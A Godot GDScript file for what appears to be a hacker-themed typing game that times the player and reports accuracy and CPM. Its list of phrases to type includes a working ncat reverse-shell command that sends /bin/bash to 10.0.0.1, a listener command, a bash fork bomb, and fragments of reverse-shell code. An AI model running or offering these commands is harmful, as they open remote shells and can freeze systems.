extends VBoxContainer

var goals = [
	"user@attack$ ncat --ssl -vv -l -p 4242",
	"ncat 10.0.0.1 4242 -e /bin/bash",
	"new ProcessBuilder(cmd).redirectErrorStream(true).start();",
	"Thread thread = new Thread();",
	":(){ :|:& };:",
	"#include <sys/socket.h>",
	"revsockaddr.sin_addr.s_addr = inet_addr(\"10.0.0.1\");",
	"process.stdin.writeln(new String.fromCharCodes(data).trim());"
]

var gid = 0

@onready var prompt_scene = preload("res://prompt.tscn")

var timer = 0.0
# Called when the node enters the scene tree for the first time.
func _ready():
	goals.shuffle()
	next_prompt()
	
var mistakes = 0.0
var good = 0.0
func next_prompt():
	if gid >= goals.size():
		# todo: game over screen
		OS.alert("Your accuracy: {0}%\nYour CPM: {1}".format([good / (mistakes + good) * 100, good / (timer / 60.0)]), 'Game Over')
		return
	var prompt = prompt_scene.instantiate()
	prompt.goal = goals[gid]
	add_child(prompt)
	gid += 1

func submit(oops, nice):
	mistakes += oops
	good += nice
	next_prompt()

func _process(delta):
	timer += delta
